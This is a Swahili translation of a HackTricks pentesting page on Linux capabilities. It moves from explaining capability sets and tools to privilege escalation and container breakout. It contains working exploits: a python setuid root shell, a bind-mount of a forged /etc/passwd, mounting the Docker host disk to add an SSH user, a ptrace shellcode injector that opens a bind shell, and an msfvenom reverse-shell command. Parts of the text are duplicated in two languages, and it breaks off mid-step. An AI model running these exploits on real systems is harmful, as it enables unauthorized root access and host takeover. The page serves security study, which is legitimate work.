# Uwezo wa Linux

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Uhispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.\\

{% embed url="https://www.rootedcon.com/" %}

## Uwezo wa Linux

Uwezo wa Linux hugawa **mamlaka ya mizizi katika vitengo vidogo na tofauti**, kuruhusu michakato kuwa na sehemu ya uwezo. Hii inapunguza hatari kwa kutokupa mamlaka kamili ya mizizi bila sababu.

### Tatizo:
- Watumiaji wa kawaida wana idhini ndogo, ikionyesha kazi kama kufungua soketi ya mtandao ambayo inahitaji ufikiaji wa mizizi.

### Seti za Uwezo:

1. **Imeorodheshwa (CapInh)**:
- **Lengo**: Inaamua uwezo unaopitishwa kutoka kwa mchakato mzazi.
- **Ufanisi**: Wakati mchakato mpya unapoundwa, unarithi uwezo kutoka kwa mzazi wake katika seti hii. Inafaa kwa kudumisha uwezo fulani kwa michakato inayozaliwa.
- **Vikwazo**: Mchakato hauwezi kupata uwezo ambao mzazi wake hakuwa nao.

2. **Halisi (CapEff)**:
- **Lengo**: Inawakilisha uwezo halisi ambao mchakato unatumia wakati wowote.
- **Ufanisi**: Ni seti ya uwezo ambayo kernel inachunguza ili kutoa idhini kwa shughuli mbalimbali. Kwa faili, seti hii inaweza kuwa alama inayoonyesha ikiwa uwezo ulioruhusiwa wa faili unapaswa kuzingatiwa kuwa halisi.
- **Umuhimu**: Seti halisi ni muhimu kwa ukaguzi wa mamlaka mara moja, ikifanya kama seti ya uwezo ya aktive ambayo mchakato unaweza kutumia.

3. **Kuruhusiwa (CapPrm)**:
- **Lengo**: Inafafanua seti kubwa ya uwezo ambao mchakato unaweza kuwa nao.
- **Ufanisi**: Mchakato unaweza kuinua uwezo kutoka kwa seti iliyoruhusiwa hadi seti yake halisi, ikimpa uwezo wa kutumia uwezo huo. Pia inaweza kuondoa uwezo kutoka kwa seti iliyoruhusiwa.
- **Kizuizi**: Inafanya kama kiwango cha juu cha uwezo ambao mchakato unaweza kuwa nao, ikahakikisha mchakato haupiti kikomo kilichopangwa cha mamlaka.

4. **Kizuizi (CapBnd)**:
- **Lengo**: Inaweka kikomo kwa uwezo ambao mchakato unaweza kupata wakati wa mzunguko wake wa maisha.
- **Ufanisi**: Hata ikiwa mchakato una uwezo fulani katika seti yake ya kurithiwa au kuruhusiwa, hauwezi kupata uwezo huo isipokuwa pia uko katika seti ya kizuizi.
- **Matumizi**: Seti hii ni muhimu hasa kwa kuzuia uwezekano wa mchakato kuongeza mamlaka yake, ikiongeza safu ya ziada ya usalama.

5. **Mazingira (CapAmb)**:
- **Lengo**: Inaruhusu uwezo fulani kuendelea kuwepo kupitia wito wa mfumo wa `execve`, ambao kwa kawaida ungefanya mchakato urejeshwe kabisa kwa uwezo wake. 
- **Ufanisi**: Inahakikisha kuwa programu zisizo na SUID ambazo hazina uwezo wa faili zinaweza kuendelea kuwa na uwezo fulani.
- **Vikwazo**: Uwezo katika seti hii unazingatia vikwazo vya seti za kurithiwa na kuruhusiwa, ikihakikisha kuwa hauzidi mamlaka yanayoruhusiwa kwa mchakato.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Kwa habari zaidi angalia:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Uwezo wa Mchakato na Programu

### Uwezo wa Mchakato

Ili kuona uwezo wa mchakato fulani, tumia faili ya **status** katika saraka ya /proc. Kwa kuwa inatoa maelezo zaidi, hebu tuweke kikomo kwenye habari zinazohusiana na uwezo wa Linux.\
Tafadhali kumbuka kuwa kwa habari za uwezo wa mchakato zinahifadhiwa kwa kila mchakato, kwa programu katika mfumo wa faili inahifadhiwa kwa sifa zilizopanuliwa.

Unaweza kupata uwezo uliowekwa katika /usr/include/linux/capability.h

Unaweza kupata uwezo wa mchakato wa sasa kwa kutumia `cat /proc/self/status` au kwa kufanya `capsh --print`, na wa watumiaji wengine katika `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Amri hii inapaswa kurudisha mistari 5 kwenye mifumo mingi.

* CapInh = Uwezo uliorithiwa
* CapPrm = Uwezo ulioruhusiwa
* CapEff = Uwezo halisi
* CapBnd = Seti ya mipaka
* CapAmb = Seti ya uwezo wa mazingira
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
## Linux Uwezo wa Kuongeza Uwezo

Kwa kutumia kifaa cha capsh, tunaweza kubadilisha nambari hizi za hexadecimali kuwa majina ya uwezo.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Hebu angalia sasa **uwezo** unaotumiwa na `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Ingawa hiyo inafanya kazi, kuna njia nyingine rahisi zaidi. Ili kuona uwezo wa mchakato unaofanya kazi, tumia tu zana ya **getpcaps** ikifuatiwa na kitambulisho cha mchakato (PID). Unaweza pia kutoa orodha ya vitambulisho vya mchakato.
```bash
getpcaps 1234
```
Hebu angalia hapa uwezo wa `tcpdump` baada ya kumpa faili ya binary uwezo wa kutosha (`cap_net_admin` na `cap_net_raw`) ili kusikiliza mtandao (_tcpdump inaendeshwa katika mchakato 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Kama unavyoona uwezo uliotolewa unalingana na matokeo ya njia 2 za kupata uwezo wa faili.\
Zana ya _getpcaps_ hutumia wito wa mfumo wa **capget()** kuuliza uwezo uliopo kwa mchakato fulani. Wito huu wa mfumo unahitaji tu kutoa PID ili kupata habari zaidi.

### Uwezo wa Faili za Kutekelezwa

Faili za kutekelezwa zinaweza kuwa na uwezo ambao unaweza kutumiwa wakati wa utekelezaji. Kwa mfano, ni kawaida sana kupata faili ya `ping` na uwezo wa `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Unaweza **kutafuta faili za binary zenye uwezo** kwa kutumia:
```bash
getcap -r / 2>/dev/null
```
### Kupunguza uwezo kwa kutumia capsh

Ikiwa tunapunguza uwezo wa CAP\_NET\_RAW kwa _ping_, basi zana ya ping haipaswi tena kufanya kazi.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Isipokuwa matokeo ya _capsh_ yenyewe, amri ya _tcpdump_ yenyewe pia inapaswa kutoa kosa.

> /bin/bash: /usr/sbin/tcpdump: Operesheni haikuruhusiwa

Kosa linaonyesha wazi kuwa amri ya ping haijiruhusu kufungua soketi ya ICMP. Sasa tunajua kwa uhakika kuwa hii inafanya kazi kama ilivyotarajiwa.

### Ondoa Uwezo

Unaweza kuondoa uwezo wa faili ya binary na
```bash
setcap -r </path/to/binary>
```
## Uwezo wa Mtumiaji

Inaonekana **niwezekana pia kumtumia mtumiaji uwezo**. Hii inamaanisha kwamba kila mchakato uliofanywa na mtumiaji utaweza kutumia uwezo wa mtumiaji.\
Kulingana na [hii](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [hii](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html), na [hii](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), inahitajika kusanidi faili kadhaa ili kumpa mtumiaji uwezo fulani, lakini faili inayoweka uwezo kwa kila mtumiaji itakuwa `/etc/security/capability.conf`.\
Mfano wa faili:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Uwezo wa Mazingira

Kwa kuchapisha programu ifuatayo, ni **inawezekana kuzindua kikao cha bash ndani ya mazingira yanayotoa uwezo**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Ndani ya **bash inayotekelezwa na faili ya binary ya mazingira iliyoundwa**, niwezekanavyo kuona **uwezo mpya** (mtumiaji wa kawaida hatakuwa na uwezo wowote katika sehemu ya "sasa").
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Unaweza **kuongeza uwezo tu ambao upo** katika seti zote mbili, yaani seti ya kuruhusiwa na seti ya kurithiwa.
{% endhint %}

### Programu zenye uwezo wa uwezo/Programu zenye uwezo mdogo

**Programu zenye uwezo wa uwezo hazitatumia uwezo mpya** uliotolewa na mazingira, hata hivyo **programu zenye uwezo mdogo zitatumia** uwezo huo kwani hazitakataa. Hii inafanya programu zenye uwezo mdogo kuwa hatarini ndani ya mazingira maalum yanayotoa uwezo kwa programu.

## Uwezo wa Huduma

Kwa chaguo-msingi, **huduma inayotumia akaunti ya root itapewa uwezo wote**, na kwa baadhi ya hali hii inaweza kuwa hatari.\
Kwa hiyo, **faili ya usanidi wa huduma** inaruhusu **kutaja** **uwezo** unayotaka huduma hiyo kuwa nayo, **na** **mtumiaji** ambaye anapaswa kutekeleza huduma hiyo ili kuepuka kuendesha huduma na mamlaka zisizo za lazima.
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Uwezo katika Kontena za Docker

Kwa chaguo-msingi, Docker inaweka uwezo kadhaa kwa kontena. Ni rahisi sana kuangalia uwezo huu kwa kukimbia:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Uwezo ni muhimu wakati unapotaka **kuzuia michakato yako mwenyewe baada ya kufanya shughuli za kipekee** (kwa mfano, baada ya kuanzisha chroot na kufunga soketi). Walakini, wanaweza kutumiwa vibaya kwa kusambaza amri au hoja zenye nia mbaya ambazo kisha zinatekelezwa kama mtumiaji mkuu.

Unaweza kulazimisha uwezo kwa programu kwa kutumia `setcap`, na kuuliza haya kwa kutumia `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` inamaanisha unaweka uwezo ("-" ingeondoa) kama Ufanisi na Kuruhusiwa.

Kutambua programu katika mfumo au folda yenye uwezo:
```bash
getcap -r / 2>/dev/null
```
### Mfano wa Utekaji

Katika mfano ufuatao, faili ya binary `/usr/bin/python2.6` imeonekana kuwa na udhaifu wa kusababisha ongezeko la mamlaka:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Uwezo** unaohitajika na `tcpdump` ili **kuruhusu mtumiaji yeyote kusikiliza pakiti**:

```markdown
To allow any user to sniff packets using `tcpdump`, the following capabilities need to be set:

1. `CAP_NET_RAW`: This capability allows the user to create raw sockets, which is necessary for packet sniffing.

To set these capabilities, you can use the `setcap` command as follows:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

This command sets the `CAP_NET_RAW` capability for the `tcpdump` binary located at `/usr/sbin/tcpdump`. With this capability set, any user will be able to run `tcpdump` and sniff packets.
```
```html
<h2>Uwezo</h2> unaohitajika na <code>tcpdump</code> ili <strong>kuruhusu mtumiaji yeyote kusikiliza pakiti</strong>:

<pre>
Ili kuruhusu mtumiaji yeyote kusikiliza pakiti kwa kutumia <code>tcpdump</code>, uwezo ufuatao unahitajika kuwekwa:

1. <code>CAP_NET_RAW</code>: Uwezo huu unaruhusu mtumiaji kuunda soketi za asili, ambayo ni muhimu kwa ajili ya kusikiliza pakiti.

Ili kuweka uwezo huu, unaweza kutumia amri ya <code>setcap</code> kama ifuatavyo:

<code>sudo setcap cap_net_raw=eip /usr/sbin/tcpdump</code>

Amri hii inaweka uwezo wa <code>CAP_NET_RAW</code> kwa faili ya <code>tcpdump</code> iliyopo kwenye njia ya <code>/usr/sbin/tcpdump</code>. Kwa kuweka uwezo huu, mtumiaji yeyote ataweza kutumia <code>tcpdump</code> na kusikiliza pakiti.
</pre>
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Kesi maalum ya uwezo "mtupu"

[Kutoka kwenye nyaraka](https://man7.org/linux/man-pages/man7/capabilities.7.html): Tafadhali kumbuka kuwa unaweza kumwezesha uwezo mtupu kwenye faili ya programu, na hivyo niwezekana kuunda programu ya set-user-ID-root ambayo inabadilisha set-user-ID ya mchakato unaoendesha programu kuwa 0, lakini haipati uwezo wowote kwa mchakato huo. Au, kwa maneno rahisi, ikiwa una faili ya binary ambayo:

1. Haiomilikiwi na root
2. Haina alama za `SUID`/`SGID` zilizowekwa
3. Ina uwezo mtupu (kwa mfano: `getcap myelf` inarudi `myelf =ep`)

basil **binary hiyo itaendeshwa kama root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ni uwezo wenye nguvu sana wa Linux, mara nyingi unalinganishwa na kiwango cha karibu-cha-root kutokana na **uwezo wake mkubwa wa utawala**, kama vile kufunga vifaa au kubadilisha vipengele vya kernel. Ingawa ni muhimu kwa kontena zinazosimulisha mifumo nzima, **`CAP_SYS_ADMIN` ina changamoto kubwa za usalama**, hasa katika mazingira ya kontena, kutokana na uwezekano wake wa kuongeza uwezo na kuhatarisha usalama wa mfumo. Kwa hiyo, matumizi yake yanahitaji tathmini kali ya usalama na usimamizi wa tahadhari, na upendeleo mkubwa wa kuondoa uwezo huu katika kontena maalum ya programu ili kuzingatia **kanuni ya uwezo mdogo** na kupunguza eneo la shambulio.

**Mfano na binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Kwa kutumia python unaweza kufunga faili iliyobadilishwa ya _passwd_ juu ya faili halisi ya _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Na hatimaye **funga** faili iliyobadilishwa ya `passwd` kwenye `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Na utaweza **`su` kama root** kwa kutumia nenosiri "password".

**Mfano na mazingira (Docker breakout)**

Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya Docker kwa kutumia:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya matokeo ya awali unaweza kuona kuwa uwezo wa SYS_ADMIN umewezeshwa.

* **Kuunganisha**

Hii inaruhusu kontena ya docker kuunganisha diski ya mwenyeji na kuiwezesha kupata kwa uhuru:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Upatikanaji kamili**

Katika njia iliyotangulia tulifanikiwa kupata ufikiaji wa diski ya mwenyeji wa docker.\
Ikiwa utagundua kuwa mwenyeji anaendesha seva ya **ssh**, unaweza **kuunda mtumiaji ndani ya diski ya mwenyeji wa docker** na kufikia kupitia SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Hii inamaanisha kuwa unaweza kutoroka kwenye chombo kwa kuingiza shellcode ndani ya mchakato fulani unaoendesha ndani ya mwenyeji.** Ili kupata ufikiaji wa michakato inayoendesha ndani ya mwenyeji, chombo kinahitaji kuendeshwa angalau na **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inaruhusu uwezo wa kutumia utambuzi na ufuatiliaji wa kazi za mfumo zinazotolewa na `ptrace(2)` na wito wa kuambatisha kumbukumbu kama vile `process_vm_readv(2)` na `process_vm_writev(2)`. Ingawa ni yenye nguvu kwa madhumuni ya uchunguzi na ufuatiliaji, ikiwa `CAP_SYS_PTRACE` inawezeshwa bila hatua za kizuizi kama vile kichujio cha seccomp kwenye `ptrace(2)`, inaweza kuhatarisha sana usalama wa mfumo. Hasa, inaweza kutumika kuzunguka vizuizi vingine vya usalama, haswa vile vilivyowekwa na seccomp, kama inavyodhihirishwa na [uthibitisho wa dhana (PoC) kama huu](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Mfano na binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Mfano na faili (gdb)**

`gdb` na uwezo wa `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
# Unda Shellcode na msfvenom kuingiza kwenye kumbukumbu kupitia gdb

Ili kuunda shellcode na msfvenom na kuiingiza kwenye kumbukumbu kupitia gdb, unaweza kufuata hatua zifuatazo:

1. Kwanza, tumia msfvenom kuunda payload ya shellcode. Chagua payload inayofaa kwa kusudi lako, kama vile `linux/x86/shell_reverse_tcp`. Chini ni mfano wa amri ya msfvenom:

   ```
   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP yako> LPORT=<Namba ya bandari> -f raw -o shellcode
   ```

   Badilisha `<IP yako>` na anwani ya IP ya mashine yako ya kusikiliza na `<Namba ya bandari>` na namba ya bandari unayotaka kutumia.

2. Baada ya kutekeleza amri hiyo, msfvenom itaunda faili ya shellcode inayoitwa "shellcode".

3. Sasa, fungua gdb na uanze kutekeleza programu ambayo unataka kuingiza shellcode ndani yake.

